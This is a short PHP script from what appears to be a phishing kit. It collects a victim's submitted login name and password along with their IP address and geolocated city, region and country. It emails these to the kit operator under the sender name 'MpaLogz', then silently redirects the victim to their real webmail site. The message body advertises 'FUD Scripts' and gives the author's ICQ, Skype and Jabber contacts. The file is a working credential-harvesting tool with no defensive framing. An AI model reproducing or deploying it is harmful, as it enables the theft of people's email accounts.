<?php
require_once('geoplugin.class.php');
include("../result/email.php");
//session_start();

//$_SESSION['email'] = $_POST['_user'];

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

	
/* Gathering Data Variables */
        $redir = $_POST['redir'];
        $agenti = $_POST['agenti'];
	$login = $_POST['logn'];
	$passwd = $_POST['passd'];


	$body = <<<EOD
Login Id: $login
Login Password: $passwd
IP Address: $ip
City: {$geoplugin->city}
Region: {$geoplugin->region}
Country: {$geoplugin->countryName}

.:\FUD Scripts/:.
ICQ ID: 729651180
Skype: elmerosor (Onye Mpa X)
Jabber: mpa@creep.im

EOD;

	$headers = "From: MpaLogz <info@yourcoolsite.com>";
	$success = mail($webMaster, $agenti, $body, $headers);
	if($redir == '') {
$domain = substr(strrchr($login, "@"), 1);
$chain = "http://webmail";

header ("Location: $chain.$domain");		
}
else {
header("Location:". $redir); 
}
exit();
  

?>